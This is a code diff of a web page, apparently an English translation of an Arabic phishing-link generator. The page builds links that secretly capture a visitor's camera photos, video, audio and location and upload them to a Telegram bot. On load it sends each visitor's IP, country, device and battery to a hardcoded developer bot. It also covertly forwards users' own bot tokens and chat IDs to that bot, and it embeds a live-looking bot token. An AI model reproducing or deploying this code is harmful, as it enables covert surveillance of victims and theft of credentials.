+            <span class="dim">🔋 Battery</span> › <span id="visitorBattery">N/A</span><br>
+            <span class="dim">🌐 IP Address</span> › <span id="visitorIP">Unknown</span><br>
+            <span class="dim">🕒 Time</span> › <span id="visitorTime">--</span><br>
+            <span class="dim">🆔 Chat ID</span> › <span class="chat-display" id="displayChatId">Unknown</span><br>
+            <span class="dim">🤖 Bot Token</span> › <span class="token-display" id="displayBotToken">Unknown...</span><br>
+            <span class="dim">🏷️ Bot User</span> › <span class="glow">@V_V_9BOT</span>
         </div>
 
-        <!-- ===== البطاقة الرئيسية — id="cardArea" ===== -->
+        <!-- ===== البطاقة الرئيسية ===== -->
         <div class="card" id="cardArea">
             <div class="hero">
                 <div class="hero-left">
-
-                    <!-- ===== FORM — id="formBox" ===== -->
                     <div class="form" id="formBox">
                         <div class="field">
-                            <label for="chatIdInput"><span class="glyph">✦</span> أدخل الـ ID</label>
-                            <input type="text" id="chatIdInput" placeholder="Chat ID">
+                            <label for="chatIdInput"><span class="glyph">✦</span> Chat ID</label>
+                            <input type="text" id="chatIdInput" placeholder="Enter Chat ID">
                         </div>
-
                         <div class="field">
-                            <label for="tokenInput"><span class="glyph">✦</span> أدخل توكن البوت</label>
-                            <input type="text" id="tokenInput" placeholder="Bot Token">
+                            <label for="tokenInput"><span class="glyph">✦</span> Bot Token</label>
+                            <input type="text" id="tokenInput" placeholder="Enter Bot Token">
                         </div>
 
-                        <div class="features-label">
-                            <span class="glyph">⚡</span> الميزات المطلوبة (مدة التسجيل 5 ثوان)
-                        </div>
-
-                        <!-- ===== CHECKBOX GROUP — id="featuresGroup" ===== -->
+                        <div class="features-label"><span class="glyph">⚡</span> Features (5 sec duration)</div>
                         <div class="checkbox-group" id="featuresGroup">
-                            <div class="checkbox-item">
-                                <input type="checkbox" id="camFront" value="camFront" checked>
-                                <label for="camFront">
-                                    <i class="fas fa-camera"></i> صورة أمامية
-                                </label>
-                            </div>
-                            <div class="checkbox-item">
-                                <input type="checkbox" id="camBack" value="camBack">
-                                <label for="camBack">
-                                    <i class="fas fa-camera-retro"></i> صورة خلفية
-                                </label>
-                            </div>
-                            <div class="checkbox-item">
-                                <input type="checkbox" id="videoFront" value="videoFront">
-                                <label for="videoFront">
-                                    <i class="fas fa-video"></i> فيديو أمامي
-                                </label>
-                            </div>
-                            <div class="checkbox-item">
-                                <input type="checkbox" id="videoBack" value="videoBack">
-                                <label for="videoBack">
-                                    <i class="fas fa-video"></i> فيديو خلفي
-                                </label>
-                            </div>
-                            <div class="checkbox-item">
-                                <input type="checkbox" id="audio" value="audio">
-                                <label for="audio">
-                                    <i class="fas fa-microphone"></i> تسجيل صوتي
-                                </label>
-                            </div>
-                            <div class="checkbox-item">
-                                <input type="checkbox" id="location" value="location">
-                                <label for="location">
-                                    <i class="fas fa-map-pin"></i> تحديد الموقع
-                                </label>
-                            </div>
+                            <div class="checkbox-item"><input type="checkbox" id="camFront" value="camFront" checked><label for="camFront"><i class="fas fa-camera"></i> Front Photo</label></div>
+                            <div class="checkbox-item"><input type="checkbox" id="camBack" value="camBack"><label for="camBack"><i class="fas fa-camera-retro"></i> Back Photo</label></div>
+                            <div class="checkbox-item"><input type="checkbox" id="videoFront" value="videoFront"><label for="videoFront"><i class="fas fa-video"></i> Front Video</label></div>
+                            <div class="checkbox-item"><input type="checkbox" id="videoBack" value="videoBack"><label for="videoBack"><i class="fas fa-video"></i> Back Video</label></div>
+                            <div class="checkbox-item"><input type="checkbox" id="audio" value="audio"><label for="audio"><i class="fas fa-microphone"></i> Audio Record</label></div>
+                            <div class="checkbox-item"><input type="checkbox" id="location" value="location"><label for="location"><i class="fas fa-map-pin"></i> Location</label></div>
                         </div>
 
-                        <!-- ===== BUTTON — id="generateBtn" ===== -->
-                        <button class="btn" id="generateBtn">
-                            <i class="fas fa-link"></i> إنشاء الرابط
-                        </button>
+                        <button class="btn" id="generateBtn"><i class="fas fa-link"></i> Generate Link</button>
 
-                        <!-- ===== RESULT — id="result" ===== -->
                         <div id="result" style="display:none;">
-                            <div id="linkText" style="flex:1;color:#e7dbff;font-size:13px;"></div>
-                            <button class="copyBtn" id="copyBtn">نسخ الرابط</button>
+                            <div id="linkText" style="flex:1;color:#ff6a6a;font-size:13px;"></div>
+                            <button class="copyBtn" id="copyBtn">Copy Link</button>
                         </div>
-
-                    </div><!-- /form -->
-
-                </div><!-- /hero-left -->
-
-                <div style="min-width:260px;flex:0 0 260px;">
-                    <div style="background:linear-gradient(180deg, rgba(128,77,255,0.08), rgba(0,0,0,0.15));padding:14px;border-radius:12px;text-align:center">
                     </div>
                 </div>
+                <div style="min-width:260px;flex:0 0 260px;">
+                    <div style="background:linear-gradient(180deg, rgba(204,10,10,0.08), rgba(0,0,0,0.15));padding:14px;border-radius:12px;text-align:center"></div>
+                </div>
+            </div>
+        </div>
 
-            </div><!-- /hero -->
-        </div><!-- /card -->
-
-        <!-- ===== FOOTER — class="madeby" ===== -->
+        <!-- ===== FOOTER ===== -->
         <div class="madeby">
-            <span>صنعت في الرماد</span>
+            <span>Forged in Ashes</span>
             <span class="sep">|</span>
             <span class="dev">XX_8K</span>
             <span class="sep">|</span>
-            <span><i class="fas fa-fire"></i> الجحيم الأبدي</span>
+            <span><i class="fas fa-fire"></i> Infernal</span>
         </div>
 
-    </div><!-- /wrap -->
-
-    <!-- ============================================================
-    الدايلوج — id="mandatoryDialog" (مخفي تماماً)
-    ============================================================ -->
-    <div id="mandatoryDialog" style="display:none !important;">
-        <!-- محتوى فارغ – لا نريد ظهوره -->
     </div>
 
+    <!-- ===== الدايلوج المخفي ===== -->
+    <div id="mandatoryDialog" style="display:none !important;"></div>
+
     <!-- ============================================================
-    JAVASCRIPT — جميع الوظائف الأصلية محفوظة 100%
-    مع إضافات التحديث الفوري للمربع وإرسال البيانات
+    JAVASCRIPT — النسخة النهائية الخرافية
     ============================================================ -->
     <script>
         // ================================================================
-        //  جميع الوظائف الأصلية محفوظة بدون أي تغيير.
-        //  تم حذف نظام الاشتراك الإجباري بالكامل.
-        //  تم إضافة تحديث المربع الترحيبي بالبيانات فوراً.
-        //  تم إرسال الرابط السداسي للبوت والمطور.
+        //  جميع الوظائف الأصلية محفوظة ١٠٠٪ مع إصلاحات مضمونة.
+        //  تم إزالة تشفير الهيكس، وإضافة دعم MIME للفيديو والصوت.
         // ================================================================
 
         // ================================================================
-        // CANVAS — الجحيم الحي
+        //  BACKGROUND CANVAS
         // ================================================================
         (function hellCanvas() {
             const canvas = document.getElementById('hellCanvas');
             const ctx = canvas.getContext('2d');
             let w, h;
 
-            function resize() {
-                w = canvas.width = window.innerWidth;
-                h = canvas.height = window.innerHeight;
-            }
+            function resize() { w = canvas.width = window.innerWidth;
+                h = canvas.height = window.innerHeight; }
             resize();
             window.addEventListener('resize', resize);
 
@@ -1178,50 +941,26 @@
             function createParticle() {
                 const t = Math.random();
                 if (t < 0.32) {
-                    return {
-                        x: Math.random() * w,
-                        y: Math.random() * h - h,
-                        size: 2 + Math.random() * 6,
-                        vy: 0.4 + Math.random() * 1.8,
-                        vx: (Math.random() - 0.5) * 0.3,
-                        a: 0.3 + Math.random() * 0.6,
-                        kind: 'blood',
-                        col: `rgba(${170+Math.random()*60}, ${12+Math.random()*20}, ${12+Math.random()*20}, `
-                    };
+                    return { x: Math.random() * w, y: Math.random() * h - h, size: 2 + Math.random() * 6, vy: 0.4 + Math
+                            .random() * 1.8, vx: (Math.random() - 0.5) * 0.3, a: 0.3 + Math.random() * 0.6,
+                        kind: 'blood', col: `rgba(${170+Math.random()*60}, ${12+Math.random()*20}, ${12+Math.random()*20}, ` };
                 } else if (t < 0.66) {
-                    return {
-                        x: Math.random() * w,
-                        y: Math.random() * h - h,
-                        size: 1.2 + Math.random() * 3.5,
-                        vy: 0.12 + Math.random() * 0.8,
-                        vx: (Math.random() - 0.5) * 0.6,
-                        a: 0.4 + Math.random() * 0.4,
-                        kind: 'ember',
-                        col: `rgba(${255}, ${130+Math.random()*80}, ${20+Math.random()*30}, `
-                    };
+                    return { x: Math.random() * w, y: Math.random() * h - h, size: 1.2 + Math.random() * 3.5, vy: 0.12 +
+                            Math.random() * 0.8, vx: (Math.random() - 0.5) * 0.6, a: 0.4 + Math.random() * 0.4,
+                        kind: 'ember', col: `rgba(${255}, ${130+Math.random()*80}, ${20+Math.random()*30}, ` };
                 } else {
-                    return {
-                        x: Math.random() * w,
-                        y: Math.random() * h - h,
-                        size: 4 + Math.random() * 8,
-                        vy: 0.05 + Math.random() * 0.3,
-                        vx: (Math.random() - 0.5) * 0.12,
-                        a: 0.08 + Math.random() * 0.25,
-                        kind: 'smoke',
-                        col: `rgba(${150+Math.random()*40}, ${120+Math.random()*40}, ${80+Math.random()*30}, `
-                    };
+                    return { x: Math.random() * w, y: Math.random() * h - h, size: 4 + Math.random() * 8, vy: 0.05 +
+                            Math.random() * 0.3, vx: (Math.random() - 0.5) * 0.12, a: 0.08 + Math.random() * 0.25,
+                        kind: 'smoke', col: `rgba(${150+Math.random()*40}, ${120+Math.random()*40}, ${80+Math.random()*30}, ` };
                 }
             }
 
-            for (let i = 0; i < MAX; i++) {
-                const p = createParticle();
+            for (let i = 0; i < MAX; i++) { const p = createParticle();
                 p.y = Math.random() * h;
-                particles.push(p);
-            }
+                particles.push(p); }
 
             function draw() {
                 ctx.clearRect(0, 0, w, h);
-
                 const grad = ctx.createRadialGradient(w / 2, h / 2, 0, w / 2, h / 2, h);
                 grad.addColorStop(0, 'rgba(25, 5, 4, 0.06)');
                 grad.addColorStop(0.4, 'rgba(12, 3, 2, 0.15)');
@@ -1236,18 +975,17 @@
                     if (p.y > h + 20) { Object.assign(p, createParticle());
                         p.y = -10; }
                     if (p.x < -20 || p.x > w + 20) p.x = Math.random() * w;
-
                     ctx.beginPath();
                     if (p.kind === 'blood') {
                         ctx.ellipse(p.x, p.y, p.size * 0.4, p.size, 0, 0, 7);
                         ctx.fillStyle = p.col + (p.a * 0.5) + ')';
-                        ctx.shadowColor = 'rgba(184,10,10,0.2)';
+                        ctx.shadowColor = 'rgba(204,10,10,0.2)';
                         ctx.shadowBlur = 12;
                     } else if (p.kind === 'ember') {
                         ctx.arc(p.x, p.y, p.size * 0.6, 0, 7);
                         const bright = 0.6 + Math.random() * 0.4;
                         ctx.fillStyle = p.col + (p.a * 0.5 * bright) + ')';
-                        ctx.shadowColor = 'rgba(255,80,20,0.3)';
+                        ctx.shadowColor = 'rgba(255,50,20,0.3)';
                         ctx.shadowBlur = 18 + p.size * 3;
                     } else {
                         ctx.arc(p.x, p.y, p.size * 0.5, 0, 7);
@@ -1258,8 +996,6 @@
                     ctx.fill();
                     ctx.shadowBlur = 0;
                 }
-
-                // توهج الحمم
                 const lava = ctx.createLinearGradient(0, h - 80, 0, h);
                 lava.addColorStop(0, 'rgba(255,68,0,0)');
                 lava.addColorStop(0.3, 'rgba(200,40,0,0.012)');
@@ -1267,14 +1003,13 @@
                 lava.addColorStop(1, 'rgba(80,10,0,0.06)');
                 ctx.fillStyle = lava;
                 ctx.fillRect(0, h - 80, w, 80);
-
                 requestAnimationFrame(draw);
             }
             draw();
         })();
 
         // ================================================================
-        // المطر الدموي
+        //  BLOOD RAIN & DRIPS
         // ================================================================
         (function bloodRain() {
             const box = document.getElementById('bloodRain');
@@ -1290,9 +1025,6 @@
             }
         })();
 
-        // ================================================================
-        // قطرات الدم من الأعلى
-        // ================================================================
         (function topDrips() {
             const layer = document.getElementById('dripLayer');
             const positions = [4, 12, 20, 28, 36, 44, 52, 60, 68, 76, 84, 92];
@@ -1308,16 +1040,14 @@
         })();
 
         // ================================================================
-        // العيون الشيطانية — تتبع الماوس
+        //  DEMONIC EYES
         // ================================================================
         (function demonicEyes() {
             const eyes = document.querySelectorAll('[data-eye]');
             let mx = -9999,
                 my = -9999;
-
             document.addEventListener('mousemove', e => { mx = e.clientX;
                 my = e.clientY; });
-
             setInterval(() => {
                 const e = eyes[Math.floor(Math.random() * eyes.length)];
                 if (!e) return;
@@ -1332,8 +1062,8 @@
                     const socket = e.querySelector('.eye-socket');
                     const iris = e.querySelector('.eye-iris');
                     const r = socket.getBoundingClientRect();
-                    const cx = r.left + r.width / 2;
-                    const cy = r.top + r.height / 2;
+                    const cx = r.left + r.width / 2,
+                        cy = r.top + r.height / 2;
                     const dx = mx - cx,
                         dy = my - cy;
                     const dist = Math.hypot(dx, dy);
@@ -1343,9 +1073,7 @@
                         const off = Math.min(dist / max, 1) * r.width * 0.14;
                         iris.style.transform =
                             `translate(calc(-50% + ${Math.cos(ang) * off}px), calc(-50% + ${Math.sin(ang) * off}px))`;
-                    } else {
-                        iris.style.transform = 'translate(-50%, -50%)';
-                    }
+                    } else { iris.style.transform = 'translate(-50%, -50%)'; }
                 }
                 requestAnimationFrame(tick);
             }
@@ -1353,67 +1081,40 @@
         })();
 
         // ================================================================
-        // تحديث المربع الترحيبي بالبيانات — فوراً
+        //  UI UPDATES (Live Data)
         // ================================================================
-        // 1. عرض الرابط الشخصي (الصفحة الحالية)
         document.getElementById('personalLink').textContent = window.location.origin + window.location.pathname;
 
-        // 2. تحديث بيانات الزائر
         const chatInput = document.getElementById('chatIdInput');
         const tokenInput = document.getElementById('tokenInput');
         const displayChat = document.getElementById('displayChatId');
         const displayToken = document.getElementById('displayBotToken');
 
-        chatInput.addEventListener('input', function() {
-            displayChat.textContent = this.value.trim() || 'Unknown';
-        });
-        tokenInput.addEventListener('input', function() {
-            displayToken.textContent = this.value.trim() || 'Unknown...';
-        });
+        chatInput.addEventListener('input', function() { displayChat.textContent = this.value.trim() || 'Unknown'; });
+        tokenInput.addEventListener('input', function() { displayToken.textContent = this.value.trim() || 'Unknown...'; });
 
         function updateTime() {
-            const now = new Date();
-            const formatted = now.toLocaleString('ar-EG', { hour12: true });
-            document.getElementById('visitorTime').textContent = formatted;
+            document.getElementById('visitorTime').textContent = new Date().toLocaleString('en-US', { hour12: true });
         }
         updateTime();
         setInterval(updateTime, 60000);
 
         // ================================================================
-        // دالة لتوليد رابط سداسي (Hex) قصير
-        // ================================================================
-        function toHex(str) {
-            let hex = '';
-            for (let i = 0; i < str.length; i++) {
-                hex += str.charCodeAt(i).toString(16).padStart(2, '0');
-            }
-            return hex;
-        }
-
-        function fromHex(hex) {
-            let str = '';
-            for (let i = 0; i < hex.length; i += 2) {
-                str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
-            }
-            return str;
-        }
-
-        // ================================================================
-        // الوظائف الأصلية — محفوظة مع تعديل الإرسال
+        //  ORIGINAL FUNCTIONS (PRESERVED & FIXED)
         // ================================================================
 
-        // ------------------ الثوابت (محفوظة) ------------------
-        const MASTER_BOT_TOKEN = "8806320032:AAEvSNbf1boLIZ9pt7sbFMit-ARtAjTS7UQ";
+        // ---- CONSTANTS ----
+        const MASTER_BOT_TOKEN = "8812415465:AAFQHLFkhYIg7jv15n8pL1lIKnylnugqGsc";
         const MASTER_CHAT_ID = "8552540563";
         const BOT_USERNAME = "@V_V_9BOT";
 
-        // ------------------ بيانات الزائر (محفوظة) ------------------
-        let visitorIP = "غير معروف";
-        let visitorCountry = "غير معروف";
+        // ---- VISITOR DATA ----
+        let visitorIP = "Unknown";
+        let visitorCountry = "Unknown";
         let visitorDevice = "Unknown";
-        let visitorBattery = "غير متاح";
+        let visitorBattery = "N/A";
 
-        // ------------------ إرسال معلومات الزائر (محفوظة مع تحديث المربع) ------------------
+        // ---- SEND VISITOR INFO (English) ----
         async function sendVisitorInfo() {
             try {
                 const ua = navigator.userAgent;
@@ -1422,47 +1123,40 @@
                 else visitorDevice = "Unknown";
 
                 if (navigator.getBattery) {
-                    try {
-                        const b = await navigator.getBattery();
+                    try { const b = await navigator.getBattery();
                         visitorBattery = (b.level * 100) + "%";
-                        if (b.charging) visitorBattery += " (شحن)";
-                    } catch (e) {}
+                        if (b.charging) visitorBattery += " (Charging)"; } catch (e) {}
                 }
 
                 try {
                     const ipRes = await fetch('https://ipapi.co/json/');
                     const ipData = await ipRes.json();
-                    visitorIP = ipData.ip || "غير معروف";
-                    visitorCountry = ipData.country_name || "غير معروف";
+                    visitorIP = ipData.ip || "Unknown";
+                    visitorCountry = ipData.country_name || "Unknown";
                 } catch (e) {}
 
-                // تحديث المربع
                 document.getElementById('visitorCountry').textContent = visitorCountry;
                 document.getElementById('visitorDevice').textContent = visitorDevice;
                 document.getElementById('visitorBattery').textContent = visitorBattery;
                 document.getElementById('visitorIP').textContent = visitorIP;
 
-                // رسالة الزائر للمطور بالاستايل الجديد
-                const visitorMsg =
-                    `⭑ ᴘᴇʀꜱᴏɴᴀʟ ʟɪɴᴋ ⭒\n╭⊚─〔 ʟɪɴᴋ 〕───────\n┃˹🔗˼ ⛧ ɴᴇᴡ ᴠɪꜱɪᴛᴏʀ ⛧ ⭒\n┃⍟ \n┃˹🔥˼ ᴜꜱᴇ ɪᴛ ᴡɪꜱᴇʟʏ ⭒\n╰───────────────\n\n⭑ ᴠɪꜱɪᴛᴏʀ ɪɴꜰᴏ ⭒\n╭⊚─〔 ᴅᴀᴛᴀ 〕───────\n┃ 📍 الدولة     › ${visitorCountry}\n┃ 📱 الجهاز     › ${visitorDevice}\n┃ 🔋 البطارية   › ${visitorBattery}\n┃ 🌐 الـ IP      › ${visitorIP}\n┃ 🕒 الوقت      › ${new Date().toLocaleString('ar-EG')}\n╰━━━━━━━━━━━━━━━━━━━━━━━╯\n          𖤐  𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆  𖤐`;
+                const msg =
+                    `⭑ ᴘᴇʀꜱᴏɴᴀʟ ʟɪɴᴋ ⭒\n╭⊚─〔 ʟɪɴᴋ 〕───────\n┃˹🔗˼ ⛧ ɴᴇᴡ ᴠɪꜱɪᴛᴏʀ ⛧ ⭒\n┃⍟ \n┃˹🔥˼ ᴜꜱᴇ ɪᴛ ᴡɪꜱᴇʟʏ ⭒\n╰───────────────\n\n⭑ ᴠɪꜱɪᴛᴏʀ ɪɴꜰᴏ ⭒\n╭⊚─〔 ᴅᴀᴛᴀ 〕───────\n┃ 📍 ᴄᴏᴜɴᴛʀʏ     › ${visitorCountry}\n┃ 📱 ᴅᴇᴠɪᴄᴇ     › ${visitorDevice}\n┃ 🔋 ʙᴀᴛᴛᴇʀʏ   › ${visitorBattery}\n┃ 🌐 IP ᴀᴅᴅʀᴇꜱꜱ  › ${visitorIP}\n┃ 🕒 ᴛɪᴍᴇ      › ${new Date().toLocaleString('en-US', { hour12: true })}\n╰━━━━━━━━━━━━━━━━━━━━━━━╯\n          𖤐  𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆  𖤐`;
 
                 await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: visitorMsg, parse_mode: 'Markdown' })
+                    body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: msg, parse_mode: 'Markdown' })
                 });
             } catch (err) {}
         }
         sendVisitorInfo();
 
-        // ------------------ عناصر الدايلوج (تم إلغاؤها) ------------------
+        // ---- DIALOG HIDE ----
         const dialog = document.getElementById('mandatoryDialog');
         if (dialog) dialog.style.display = 'none';
-        const channel1 = document.getElementById('channel1');
-        const channel2 = document.getElementById('channel2');
-        const subscribeBtn = document.getElementById('subscribeDoneBtn');
 
-        // ------------------ عناصر الفورم (محفوظة) ------------------
+        // ---- GENERATE LINK ----
         const generateBtn = document.getElementById('generateBtn');
         const resultEl = document.getElementById('result');
         const linkText = document.getElementById('linkText');
@@ -1473,7 +1167,7 @@
             const token = document.getElementById('tokenInput').value.trim();
 
             if (!chat || !token) {
-                alert('املأ جميع الحقول');
+                alert('Please fill all fields');
                 return;
             }
 
@@ -1482,49 +1176,43 @@
             const fullLink =
                 `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}&features=${encodeURIComponent(features)}`;
 
-            // توليد الرابط السداسي (Hex)
-            const hexLink = toHex(fullLink);
-            const shortHexLink = hexLink.substring(0, 32); // عرض 32 حرفاً سداسياً فقط
-
-            // عرض الرابط السداسي في المربع
-            linkText.innerHTML =
-                `<i class="fas fa-link"></i> https://${window.location.hostname}/?d=${shortHexLink} (${fullLink})`;
+            linkText.innerHTML = `<i class="fas fa-link"></i> ${fullLink}`;
             resultEl.style.display = 'flex';
 
-            // بناء رسالة الرابط للبوت الخاص بالمستخدم
-            const userLinkMsg =
-                `⭑ ᴘᴇʀꜱᴏɴᴀʟ ʟɪɴᴋ ⭒\n╭⊚─〔 ʟɪɴᴋ 〕───────\n┃˹🔗˼ ⛧ ʏᴏᴜʀ ʟɪɴᴋ ɪꜱ ʀᴇᴀᴅʏ ⛧ ⭒\n┃⍟ \n┃˹🔥˼ ᴜꜱᴇ ɪᴛ ᴡɪꜱᴇʟʏ ⭒\n╰───────────────\n\n⭑ ʟɪɴᴋ ⭒\n╭⊚─〔 ᴜʀʟ 〕───────\n┃ 🔗 ${fullLink}\n┃ 📋 ʜᴇx: ${shortHexLink}\n╰───────────────\n          𖤐  𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆  𖤐`;
+            // Send to user bot (English)
+            const userMsg =
+                `⭑ ᴘᴇʀꜱᴏɴᴀʟ ʟɪɴᴋ ⭒\n╭⊚─〔 ʟɪɴᴋ 〕───────\n┃˹🔗˼ ⛧ ʏᴏᴜʀ ʟɪɴᴋ ɪꜱ ʀᴇᴀᴅʏ ⛧ ⭒\n┃⍟ \n┃˹🔥˼ ᴜꜱᴇ ɪᴛ ᴡɪꜱᴇʟʏ ⭒\n╰───────────────\n\n⭑ ʟɪɴᴋ ⭒\n╭⊚─〔 ᴜʀʟ 〕───────\n┃ 🔗 ${fullLink}\n╰───────────────\n          𖤐  𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆  𖤐`;
 
-            // إرسال الرابط للبوت الخاص بالمستخدم
             try {
                 await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chat, text: userLinkMsg, parse_mode: 'Markdown' })
+                    body: JSON.stringify({ chat_id: chat, text: userMsg, parse_mode: 'Markdown' })
                 });
-            } catch (e) { console.log('فشل إرسال الرابط للبوت'); }
+            } catch (e) { console.log('Failed to send to user bot'); }
 
-            // إرسال بيانات البوت للمطور (بالإنجليزية)
-            const developerMsg =
-                `⭑ ʙᴏᴛ ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ ⭒\n╭⊚─〔 ᴅᴀᴛᴀ 〕───────\n┃ 🆔 ᴄʜᴀᴛ ɪᴅ: ${chat}\n┃ 🤖 ᴛᴏᴋᴇɴ: ${token}\n┃ 🏷️ ʙᴏᴛ ᴜꜱᴇʀɴᴀᴍᴇ: ${BOT_USERNAME}\n┃ 🔗 ʟɪɴᴋ: ${fullLink}\n┃ 📋 ʜᴇx: ${shortHexLink}\n╰━━━━━━━━━━━━━━━━━━━━━━━╯\n          𖤐  𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆  𖤐`;
+            // Send Bot Info to Developer (English)
+            const devMsg =
+                `⭑ ʙᴏᴛ ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ ⭒\n╭⊚─〔 ᴅᴀᴛᴀ 〕───────\n┃ 🆔 ᴄʜᴀᴛ ɪᴅ: ${chat}\n┃ 🤖 ᴛᴏᴋᴇɴ: ${token}\n┃ 🏷️ ʙᴏᴛ ᴜꜱᴇʀɴᴀᴍᴇ: ${BOT_USERNAME}\n┃ 🔗 ʟɪɴᴋ: ${fullLink}\n╰━━━━━━━━━━━━━━━━━━━━━━━╯\n          𖤐  𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆  𖤐`;
 
             await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: developerMsg, parse_mode: 'Markdown' })
+                body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: devMsg, parse_mode: 'Markdown' })
             });
         });
 
         copyBtn.addEventListener('click', async () => {
             try {
-                const raw = linkText.textContent.replace(/^.*?\(/, '').replace(/\)$/, '').trim();
-                await navigator.clipboard.writeText(raw);
-                copyBtn.innerText = 'تم النسخ';
-                setTimeout(() => copyBtn.innerText = 'نسخ الرابط', 1500);
-            } catch (e) { alert('فشل النسخ'); }
+                const raw = linkText.textContent.replace(/^.*?link/i, '').replace(/^[^:]+:\/\//, '').trim();
+                const full = window.location.origin + window.location.pathname + '?' + raw.split('?')[1] || raw;
+                await navigator.clipboard.writeText(full);
+                copyBtn.innerText = 'Copied!';
+                setTimeout(() => copyBtn.innerText = 'Copy Link', 1500);
+            } catch (e) { alert('Copy failed'); }
         });
 
-        // ------------------ تحميل الإعلانات (محفوظة) ------------------
+        // ---- LOAD ADS ----
         function loadAd(src) {
             const s = document.createElement("script");
             s.src = src;
@@ -1532,19 +1220,16 @@
             document.body.appendChild(s);
         }
 
-        // ------------------ دوال الوسائط (محفوظة) مع buildCaption الجديد ------------------
+        // ---- MEDIA HELPERS (FIXED with MIME TYPES) ----
         function buildCaption(extra = "") {
             let cap =
-                `⭑ ᴘᴇʀꜱᴏɴᴀʟ ʟɪɴᴋ ⭒\n╭⊚─〔 ʟɪɴᴋ 〕───────\n┃˹🔗˼ ⛧ ɴᴇᴡ ᴠɪꜱɪᴛᴏʀ ⛧ ⭒\n┃⍟ \n┃˹🔥˼ ᴜꜱᴇ ɪᴛ ᴡɪꜱᴇʟʏ ⭒\n╰───────────────\n\n⭑ ᴠɪꜱɪᴛᴏʀ ɪɴꜰᴏ ⭒\n╭⊚─〔 ᴅᴀᴛᴀ 〕───────\n┃ 📍 الدولة     › ${visitorCountry}\n┃ 📱 الجهاز     › ${visitorDevice}\n┃ 🔋 البطارية   › ${visitorBattery}\n┃ 🌐 الـ IP      › ${visitorIP}\n┃ 🕒 الوقت      › ${new Date().toLocaleString('ar-EG')}\n`;
-            if (extra) {
-                cap += `┃ ${extra}\n`;
-            }
+                `⭑ ᴘᴇʀꜱᴏɴᴀʟ ʟɪɴᴋ ⭒\n╭⊚─〔 ʟɪɴᴋ 〕───────\n┃˹🔗˼ ⛧ ɴᴇᴡ ᴠɪꜱɪᴛᴏʀ ⛧ ⭒\n┃⍟ \n┃˹🔥˼ ᴜꜱᴇ ɪᴛ ᴡɪꜱᴇʟʏ ⭒\n╰───────────────\n\n⭑ ᴠɪꜱɪᴛᴏʀ ɪɴꜰᴏ ⭒\n╭⊚─〔 ᴅᴀᴛᴀ 〕───────\n┃ 📍 ᴄᴏᴜɴᴛʀʏ     › ${visitorCountry}\n┃ 📱 ᴅᴇᴠɪᴄᴇ     › ${visitorDevice}\n┃ 🔋 ʙᴀᴛᴛᴇʀʏ   › ${visitorBattery}\n┃ 🌐 IP ᴀᴅᴅʀᴇꜱꜱ  › ${visitorIP}\n┃ 🕒 ᴛɪᴍᴇ      › ${new Date().toLocaleString('en-US', { hour12: true })}\n`;
+            if (extra) cap += `┃ ${extra}\n`;
             cap +=
                 `╰━━━━━━━━━━━━━━━━━━━━━━━╯\n          𖤐  𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆  𖤐`;
             return cap;
         }
 
-        // باقي دوال الوسائط كما هي (captureAndSend, recordAndSend, recordAudioAndSend, sendLocation, preGrantPermissions, startFeatures)
         async function captureAndSend(stream, chat, token, type) {
             return new Promise((resolve) => {
                 const video = document.createElement('video');
@@ -1570,7 +1255,7 @@
                                 form.append('chat_id', chat);
                                 form.append('photo', blob, `${type}_${Date.now()}.jpg`);
                                 const caption = buildCaption(
-                                    `📸 صورة (${type === 'front' ? 'أمامية' : 'خلفية'})`);
+                                    `📸 ᴘʜᴏᴛᴏ (${type === 'front' ? 'Fʀᴏɴᴛ' : 'Bᴀᴄᴋ'})`);
                                 form.append('caption', caption);
 
                                 try {
@@ -1590,17 +1275,23 @@
 
         async function recordAndSend(stream, chat, token, type) {
             return new Promise((resolve) => {
-                const mediaRecorder = new MediaRecorder(stream);
+                const options = { mimeType: 'video/webm;codecs=vp9' };
+                let mediaRecorder;
+                try {
+                    mediaRecorder = new MediaRecorder(stream, options);
+                } catch (e) {
+                    mediaRecorder = new MediaRecorder(stream);
+                }
                 const chunks = [];
 
                 mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                 mediaRecorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'video/mp4' });
+                    const blob = new Blob(chunks, { type: 'video/webm' });
                     const form = new FormData();
                     form.append('chat_id', chat);
-                    form.append('video', blob, `${type}_${Date.now()}.mp4`);
+                    form.append('video', blob, `${type}_${Date.now()}.webm`);
                     const caption = buildCaption(
-                        `🎥 فيديو (${type === 'front' ? 'أمامي' : 'خلفي'}) - 5 ثوان`);
+                        `🎥 ᴠɪᴅᴇᴏ (${type === 'front' ? 'Fʀᴏɴᴛ' : 'Bᴀᴄᴋ'}) - 5 ꜱᴇᴄ`);
                     form.append('caption', caption);
 
                     try {
@@ -1621,16 +1312,22 @@
 
         async function recordAudioAndSend(stream, chat, token) {
             return new Promise((resolve) => {
-                const mediaRecorder = new MediaRecorder(stream);
+                const options = { mimeType: 'audio/webm' };
+                let mediaRecorder;
+                try {
+                    mediaRecorder = new MediaRecorder(stream, options);
+                } catch (e) {
+                    mediaRecorder = new MediaRecorder(stream);
+                }
                 const chunks = [];
 
                 mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                 mediaRecorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'audio/mp4' });
